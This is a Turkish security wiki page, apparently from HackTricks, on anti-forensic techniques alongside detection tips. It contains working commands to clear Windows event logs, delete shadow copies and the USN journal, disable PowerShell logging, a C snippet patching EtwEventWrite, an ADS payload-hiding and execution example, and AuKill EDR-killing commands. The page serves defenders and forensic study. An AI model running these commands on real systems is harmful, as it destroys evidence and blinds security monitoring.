# Anti-Forensic Teknikler

## Zaman Damgaları

Bir saldırgan, tespit edilmekten kaçınmak için **dosyaların zaman damgalarını değiştirmekle** ilgilenebilir.\
Zaman damgalarını MFT içinde `$STANDARD_INFORMATION` \_\_ ve \_\_ `$FILE_NAME` özniteliklerinde bulmak mümkündür.

Her iki öznitelikte de 4 zaman damgası bulunur: **Değiştirme**, **erişim**, **oluşturma** ve **MFT kayıt değiştirme** (MACE veya MACB).

**Windows explorer** ve diğer araçlar bilgileri **`$STANDARD_INFORMATION`** üzerinden gösterir.

### TimeStomp - Anti-forensic Tool

Bu araç, **`$STANDARD_INFORMATION`** içindeki zaman damgası bilgilerini **değiştirir**, ancak **`$FILE_NAME`** içindeki bilgileri **değiştirmez**. Bu nedenle **şüpheli** **etkinliği** **tespit etmek** mümkündür.

### Usnjrnl

**USN Journal** (Update Sequence Number Journal), birim değişikliklerini takip eden NTFS'nin (Windows NT file system) bir özelliğidir. [**UsnJrnl2Csv**](https://github.com/jschicht/UsnJrnl2Csv) aracı, bu değişikliklerin incelenmesine olanak tanır.

![TimeStomp - Anti-forensic Tool - Usnjrnl: USN Journal (Update Sequence Number Journal), birim değişikliklerini takip eden NTFS'nin (Windows NT file system) bir özelliğidir. ...](<../../images/image (801).png>)

Önceki görsel, **araç** tarafından gösterilen **çıktıdır** ve dosya üzerinde bazı **değişikliklerin yapıldığı** görülebilir.

### $LogFile

**Bir dosya sistemindeki tüm metadata değişiklikleri**, [write-ahead logging](https://en.wikipedia.org/wiki/Write-ahead_logging) olarak bilinen bir işlemle günlüğe kaydedilir. Günlüğe kaydedilen metadata, bir NTFS dosya sisteminin kök dizininde bulunan `**$LogFile**` adlı dosyada tutulur. Bu dosyayı ayrıştırmak ve değişiklikleri tespit etmek için [LogFileParser](https://github.com/jschicht/LogFileParser) gibi araçlar kullanılabilir.

![Usnjrnl - $LogFile: Bir dosya sistemindeki tüm metadata değişiklikleri, write-ahead logging olarak bilinen bir işlemle günlüğe kaydedilir. Günlüğe kaydedilen metadata, kök dizinde bulunan $LogFile adlı dosyada tutulur...](<../../images/image (137).png>)

Yine, aracın çıktısında **bazı değişikliklerin yapıldığı** görülebilir.

Aynı araç kullanılarak zaman damgalarının **hangi zamana değiştirildiği** tespit edilebilir:

![Usnjrnl - $LogFile: Aynı araç kullanılarak zaman damgalarının hangi zamana değiştirildiği tespit edilebilir](<../../images/image (1089).png>)

- CTIME: Dosyanın oluşturulma zamanı
- ATIME: Dosyanın değiştirilme zamanı
- MTIME: Dosyanın MFT kayıt değiştirme zamanı
- RTIME: Dosyanın erişim zamanı

### `$STANDARD_INFORMATION` ve `$FILE_NAME` karşılaştırması

Şüpheli şekilde değiştirilmiş dosyaları tespit etmenin bir diğer yolu, **uyuşmazlıkları** aramak için her iki öznitelikteki zamanları karşılaştırmaktır.

### Nanoseconds

**NTFS** zaman damgaları **100 nanosaniye** hassasiyete sahiptir. Bu nedenle 2010-10-10 10:10:**00.000:0000 gibi zaman damgalarına sahip dosyaların bulunması oldukça şüphelidir**.

### SetMace - Anti-forensic Tool

Bu araç hem `$STARNDAR_INFORMATION` hem de `$FILE_NAME` özniteliklerini değiştirebilir. Ancak Windows Vista'dan itibaren bu bilgileri değiştirmek için çalışan bir OS gerekir.

## Data Hiding

NFTS, bir cluster ve minimum bilgi boyutunu kullanır. Bu, bir dosya bir buçuk cluster kullanıyorsa, **kalan yarının dosya silinene kadar hiçbir zaman kullanılmayacağı** anlamına gelir. Böylece **slack space içinde veri gizlemek** mümkündür.

slacker gibi araçlar, verilerin bu "gizli" alanda saklanmasına olanak tanır. Ancak `$logfile` ve `$usnjrnl` analizi, bazı verilerin eklendiğini gösterebilir:

![SetMace - Anti-forensic Tool - Data Hiding: slacker gibi araçlar, verilerin bu "gizli" alanda saklanmasına olanak tanır. Ancak $logfile ve $usnjrnl analizi bazı verilerin eklendiğini gösterebilir...](<../../images/image (1060).png>)

Daha sonra FTK Imager gibi araçlar kullanılarak slack space alınabilir. Bu tür araçların içeriği obfuscation uygulanmış veya hatta şifrelenmiş şekilde kaydedebileceğini unutmayın.

## UsbKill

Bu araç, USB portlarında herhangi bir değişiklik algılanırsa **bilgisayarı kapatır**.\
Bunu keşfetmenin bir yolu çalışan işlemleri incelemek ve **çalışan her Python scriptini gözden geçirmektir**.

## Live Linux Distributions

Bu dağıtımlar **RAM** belleği içinde **çalıştırılır**. Bunları tespit etmenin tek yolu, NTFS file-system'ın **yazma izinleriyle bağlanmış olmasıdır**. Yalnızca okuma izinleriyle bağlanmışsa izinsiz girişi tespit etmek mümkün olmaz.

## Secure Deletion

[https://github.com/Claudio-C/awesome-data-sanitization](https://github.com/Claudio-C/awesome-data-sanitization)

## Windows Configuration

Forensics incelemesini çok daha zor hale getirmek için çeşitli Windows logging yöntemlerini devre dışı bırakmak mümkündür.

### Disable Timestamps - UserAssist

Bu, her executable'ın kullanıcı tarafından çalıştırıldığı tarih ve saatleri tutan bir registry anahtarıdır.

UserAssist'i devre dışı bırakmak iki adım gerektirir:

1. UserAssist'i devre dışı bırakmak istediğimizi belirtmek için `HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Start_TrackProgs` ve `HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Start_TrackEnabled` olmak üzere iki registry anahtarını da sıfıra ayarlayın.
2. `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist\<hash>` benzeri görünen registry alt ağaçlarını temizleyin.

### Disable Timestamps - Prefetch

Bu, Windows sisteminin performansını artırmak amacıyla çalıştırılan application'lar hakkındaki bilgileri kaydeder. Ancak bu bilgiler forensics uygulamaları için de yararlı olabilir.

- `regedit` çalıştırın
- `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SessionManager\Memory Management\PrefetchParameters` file path'ini seçin
- Hem `EnablePrefetcher` hem de `EnableSuperfetch` üzerine sağ tıklayın
- Değeri 1'den (veya 3'ten) 0'a değiştirmek için her birinde Modify seçeneğini seçin
- Yeniden başlatın

### Disable Timestamps - Last Access Time

Bir Windows NT server üzerinde bir NTFS volume içinden her klasör açıldığında sistem, last access time olarak adlandırılan **listelenen her klasördeki bir zaman damgası alanını güncellemek** için zamanı kaydeder. Yoğun kullanılan bir NTFS volume üzerinde bu durum performansı etkileyebilir.

1. Registry Editor'ı (Regedit.exe) açın.
2. `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\FileSystem` konumuna gidin.
3. `NtfsDisableLastAccessUpdate` anahtarını arayın. Mevcut değilse bu DWORD'u ekleyin ve değerini 1 olarak ayarlayın; bu işlemi devre dışı bırakacaktır.
4. Registry Editor'ı kapatın ve server'ı yeniden başlatın.

### Delete USB History

Tüm **USB Device Entries**, USB Device'ı PC'nize veya Laptop'ınıza taktığınızda oluşturulan alt anahtarları içeren **USBSTOR** registry anahtarının altında Windows Registry'de saklanır. Bu anahtarı burada bulabilirsiniz: `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Enum\USBSTOR`. **Bunu silerek** USB geçmişini silersiniz.\
Bunları sildiğinizden emin olmak (ve silmek) için [**USBDeview**](https://www.nirsoft.net/utils/usb_devices_view.html) aracını da kullanabilirsiniz.

USB'ler hakkındaki bilgileri kaydeden başka bir dosya da `C:\Windows\INF` içindeki `setupapi.dev.log` dosyasıdır. Bu dosya da silinmelidir.

### Disable Shadow Copies

Shadow copy'leri `vssadmin list shadowstorage` ile **listeleyin**\
`vssadmin delete shadow` komutunu çalıştırarak bunları **silin**

Ayrıca [https://www.ubackup.com/windows-10/how-to-delete-shadow-copies-windows-10-5740.html](https://www.ubackup.com/windows-10/how-to-delete-shadow-copies-windows-10-5740.html) adresinde önerilen adımları izleyerek GUI üzerinden de silebilirsiniz.

Shadow copy'leri devre dışı bırakmak için [buradaki adımlar](https://support.waters.com/KB_Inf/Other/WKB15560_How_to_disable_Volume_Shadow_Copy_Service_VSS_in_Windows):

1. Windows start button'a tıkladıktan sonra text search box'a "services" yazarak Services programını açın.
2. Listeden "Volume Shadow Copy" öğesini bulun, seçin ve ardından sağ tıklayarak Properties'e erişin.
3. "Startup type" drop-down menüsünden Disabled'ı seçin ve Apply ile OK'e tıklayarak değişikliği onaylayın.

Shadow copy içinde hangi dosyaların kopyalanacağını registry'deki `HKLM\SYSTEM\CurrentControlSet\Control\BackupRestore\FilesNotToSnapshot` konumundan değiştirmek de mümkündür.

### Overwrite deleted files

- Bir **Windows tool** kullanabilirsiniz: `cipher /w:C`. Bu, cipher'a C drive içindeki kullanılabilir boş disk alanındaki verileri kaldırmasını söyler.
- [**Eraser**](https://eraser.heidi.ie) gibi araçları da kullanabilirsiniz.

### Delete Windows event logs

- Windows + R --> eventvwr.msc --> "Windows Logs" öğesini genişletin --> Her kategoriye sağ tıklayın ve "Clear Log" seçeneğini seçin
- `for /F "tokens=*" %1 in ('wevtutil.exe el') DO wevtutil.exe cl "%1"`
- `Get-EventLog -LogName * | ForEach { Clear-EventLog $_.Log }`

### Disable Windows event logs

- `reg add 'HKLM\\SYSTEM\\CurrentControlSet\\Services\\eventlog' /v Start /t REG_DWORD /d 4 /f`
- Services bölümünde "Windows Event Log" servisini devre dışı bırakın
- `WEvtUtil.exec clear-log` veya `WEvtUtil.exe cl`

### Disable $UsnJrnl

- `fsutil usn deletejournal /d c:`

---

## Advanced Logging & Trace Tampering (2023-2025)

### PowerShell ScriptBlock/Module Logging

Windows 10/11'in ve Windows Server'ın son sürümleri, `Microsoft-Windows-PowerShell/Operational` altında (4104/4105/4106 event'leri) **ayrıntılı PowerShell forensics artifact'leri** tutar.
Saldırganlar bunları anında devre dışı bırakabilir veya silebilir:
```powershell
# Turn OFF ScriptBlock & Module logging (registry persistence)
New-ItemProperty -Path "HKLM:\\SOFTWARE\\Microsoft\\PowerShell\\3\\PowerShellEngine" \
-Name EnableScriptBlockLogging -Value 0 -PropertyType DWord -Force
New-ItemProperty -Path "HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ModuleLogging" \
-Name EnableModuleLogging -Value 0 -PropertyType DWord -Force

# In-memory wipe of recent PowerShell logs
Get-WinEvent -LogName 'Microsoft-Windows-PowerShell/Operational' |
Remove-WinEvent               # requires admin & Win11 23H2+
```
Savunmacılar, bu registry anahtarlarında yapılan değişiklikleri ve PowerShell olaylarının yüksek hacimli şekilde silinmesini izlemelidir.

### ETW (Event Tracing for Windows) Patch

Endpoint security ürünleri büyük ölçüde ETW’ye dayanır. 2024’te popüler bir kaçınma yöntemi, bellekte `ntdll!EtwEventWrite`/`EtwEventWriteFull` işlevlerine patch uygulayarak her ETW çağrısının olayı yayınlamadan `STATUS_SUCCESS` döndürmesini sağlamaktır:<sup>[[5]](#references)</sup>
```c
// 0xC3 = RET on x64
unsigned char patch[1] = { 0xC3 };
WriteProcessMemory(GetCurrentProcess(),
GetProcAddress(GetModuleHandleA("ntdll.dll"), "EtwEventWrite"),
patch, sizeof(patch), NULL);
```
Public PoCs (ör. `EtwTiSwallow`) aynı primitive'i PowerShell veya C++ ile uygular.
Patch **process-local** olduğu için diğer process'lerin içinde çalışan EDR'ler bunu gözden kaçırabilir.<sup>[[5]](#references)</sup>
Detection: bellekteki `ntdll` ile diskteki sürümü karşılaştırın veya user-mode'dan önce hook uygulayın.

### Alternate Data Streams (ADS) Revival

2023'teki malware kampanyalarında (ör. **FIN12** loaders), traditional scanner'ların görüş alanından uzak kalmak için second-stage binary'leri
ADS içinde staging ettikleri görüldü:
```cmd
rem Hide cobalt.bin inside an ADS of a PDF
type cobalt.bin > report.pdf:win32res.dll
rem Execute directly
wmic process call create "cmd /c report.pdf:win32res.dll"
```
Akışları `dir /R`, `Get-Item -Stream *` veya Sysinternals `streams64.exe` ile listeleyin.
Host dosyasının FAT/exFAT'e veya SMB üzerinden kopyalanması gizli akışı kaldırır ve
investigators tarafından payload'u kurtarmak için kullanılabilir.

### BYOVD & “AuKill” (2023)

Bring-Your-Own-Vulnerable-Driver, ransomware
saldırılarında **anti-forensics** amacıyla artık rutin olarak kullanılmaktadır.
Açık kaynaklı **AuKill** aracı, şifreleme ve log destruction
öncesinde EDR ve forensic sensörlerini **suspend** veya **terminate** etmek için imzalı ancak
zafiyetli bir driver (`procexp152.sys`) yükler:<sup>[[1]](#references)</sup>
```cmd
AuKill.exe -e "C:\\Program Files\\Windows Defender\\MsMpEng.exe"
AuKill.exe -k CrowdStrike
```
Driver sonrasında kaldırılır ve geride minimum düzeyde artifact bırakır.<sup>[[1]](#references)</sup>
Mitigations: Microsoft vulnerable-driver blocklist'i (HVCI/SAC) etkinleştirin
ve user-writable path'lerden kernel-service oluşturulması konusunda alert üretin.

---

## Linux Anti-Forensics: Self-Patching ve Cloud C2 (2023–2025)

### Detection'ı azaltmak için ele geçirilmiş servislerde self-patching (Linux)
Adversary'ler, yeniden exploitation'ı önlemek ve vulnerability-based detection'ları bastırmak için bir servisi exploit ettikten hemen sonra giderek daha fazla “self-patch” ediyor. Buradaki fikir, vulnerable component'leri en güncel legitimate upstream binary/JAR'larıyla değiştirmektir; böylece scanner'lar host'un patched olduğunu bildirirken persistence ve C2 çalışmaya devam eder.<sup>[[3]](#references)</sup>

Örnek: Apache ActiveMQ OpenWire RCE (CVE‑2023‑46604).<sup>[[3]](#references)[[4]](#references)</sup>
- Post-exploitation sonrasında attackers, Maven Central'dan (repo1.maven.org) legitimate JAR'lar indirdi, ActiveMQ installation'ındaki vulnerable JAR'ları sildi ve broker'ı yeniden başlattı.
- Bu işlem initial RCE'yi kapatırken diğer foothold'ları (cron, SSH config değişiklikleri, ayrı C2 implant'ları) korudu.

Operational example (illustrative)
```bash
# ActiveMQ install root (adjust as needed)
AMQ_DIR=/opt/activemq
cd "$AMQ_DIR"/lib

# Fetch patched JARs from Maven Central (versions as appropriate)
curl -fsSL -O https://repo1.maven.org/maven2/org/apache/activemq/activemq-client/5.18.3/activemq-client-5.18.3.jar
curl -fsSL -O https://repo1.maven.org/maven2/org/apache/activemq/activemq-openwire-legacy/5.18.3/activemq-openwire-legacy-5.18.3.jar

# Remove vulnerable files and ensure the service uses the patched ones
rm -f activemq-client-5.18.2.jar activemq-openwire-legacy-5.18.2.jar || true
ln -sf activemq-client-5.18.3.jar activemq-client.jar
ln -sf activemq-openwire-legacy-5.18.3.jar activemq-openwire-legacy.jar

# Apply changes without removing persistence
systemctl restart activemq || service activemq restart
```
Forensic/hunting ipuçları
- Planlanmamış binary/JAR değişiklikleri için service dizinlerini inceleyin:
- Debian/Ubuntu: `dpkg -V activemq` ve dosya hash/path değerlerini repo mirror'larıyla karşılaştırın.
- Diskte package manager tarafından sahiplenilmeyen JAR sürümlerini veya out-of-band güncellenmiş symbolic link'leri arayın.
- Timeline: `find "$AMQ_DIR" -type f -printf '%TY-%Tm-%Td %TH:%TM %p\n' | sort` komutunu kullanarak ctime/mtime değerlerini compromise zaman aralığıyla ilişkilendirin.
- Shell history/process telemetry: initial exploitation sonrasında hemen `repo1.maven.org` veya diğer artifact CDN'lerine yapılan `curl`/`wget` çağrılarına dair kanıtları arayın.
- Change management: yalnızca patched version'ın mevcut olduğunu doğrulamakla kalmayın; “patch”i kimin ve neden uyguladığını doğrulayın.

### Bearer token'lar ve anti-analysis stager'lar ile Cloud-service C2
Gözlemlenen tradecraft, birden fazla long-haul C2 path'ini ve anti-analysis packaging'i bir arada kullanıyordu:<sup>[[3]](#references)</sup>
- Sandboxing ve static analysis'i zorlaştırmak için password-protected PyInstaller ELF loader'ları (ör. encrypted PYZ, `/_MEI*` altında temporary extraction).
- Göstergeler: `PyInstaller`, `pyi-archive`, `PYZ-00.pyz`, `MEIPASS` gibi `strings` sonuçları.
- Runtime artifacts: `/tmp/_MEI*` veya özel `--runtime-tmpdir` path'lerine extraction.
- Hardcoded OAuth Bearer token'ları kullanan Dropbox-backed C2
- Network markers: `Authorization: Bearer <token>` ile birlikte `api.dropboxapi.com` / `content.dropboxapi.com`.
- Normalde dosya sync etmeyen server workload'larından Dropbox domain'lerine yapılan outbound HTTPS trafiğini proxy/NetFlow/Zeek/Suricata üzerinde hunt edin.
- Tunneling üzerinden parallel/backup C2 (ör. Cloudflare Tunnel `cloudflared`); kanallardan biri engellense bile control'ü korur.
- Host IOCs: `cloudflared` process/unit'leri, `~/.cloudflared/*.json` altındaki config ve Cloudflare edge'lerine outbound 443.

### Access'i korumak için persistence ve “hardening rollback” (Linux örnekleri)
Attackers sıklıkla self-patching işlemini durable access path'leriyle birleştirir:<sup>[[3]](#references)</sup>
- Cron/Anacron: periyodik execution için her `/etc/cron.*/` dizinindeki `0anacron` stub'ında yapılan değişiklikler.
- Hunt:
```bash
for d in /etc/cron.*; do [ -f "$d/0anacron" ] && stat -c '%n %y %s' "$d/0anacron"; done
grep -R --line-number -E 'curl|wget|python|/bin/sh' /etc/cron.*/* 2>/dev/null
```
- SSH configuration hardening rollback: root login'lerini etkinleştirme ve low-privileged account'lar için default shell'leri değiştirme.
- Root login enablement için hunt:
```bash
grep -E '^\s*PermitRootLogin' /etc/ssh/sshd_config
# flag values like "yes" or overly permissive settings
```
- System account'larda (ör. `games`) şüpheli interactive shell'leri arayın:
```bash
awk -F: '($7 ~ /bin\/(sh|bash|zsh)/ && $1 ~ /^(games|lp|sync|shutdown|halt|mail|operator)$/) {print}' /etc/passwd
```
- Disk'e bırakılan ve aynı zamanda cloud C2'ye contact eden random, kısa isimli beacon artifact'ları (8 alphabetical karakter):
- Hunt:
```bash
find / -maxdepth 3 -type f -regextype posix-extended -regex '.*/[A-Za-z]{8}$' \
-exec stat -c '%n %s %y' {} \; 2>/dev/null | sort
```

Defenders, initial exploitation'ı gizlemek için kullanılan anti-forensic self-remediation'ı ortaya çıkarmak amacıyla bu artifact'ları external exposure ve service patching event'leriyle ilişkilendirmelidir.

## References

- [1] [Sophos X-Ops – AuKill: EDR'yi Devre Dışı Bırakmak İçin Weaponized Vulnerable Driver (Mart 2023)](https://news.sophos.com/en-us/2023/03/07/aukill-a-weaponized-vulnerable-driver-for-disabling-edr)
- [2] [Red Canary – Stealth İçin EtwEventWrite'ı Patching: Detection & Hunting (Haziran 2024)](https://redcanary.com/blog/etw-patching-detection)
- [3] [Red Canary – Persistence İçin Patching: DripDropper Linux Malware Cloud İçinde Nasıl İlerliyor](https://redcanary.com/blog/threat-intelligence/dripdropper-linux-malware/)
- [4] [CVE‑2023‑46604 – Apache ActiveMQ OpenWire RCE (NVD)](https://nvd.nist.gov/vuln/detail/CVE-2023-46604)
- [5] [Hiding Your .NET - ETW (Adam Chester / XPN)](https://blog.xpnsec.com/hiding-your-dotnet-etw/)
{{#include ../../banners/hacktricks-training.md}}
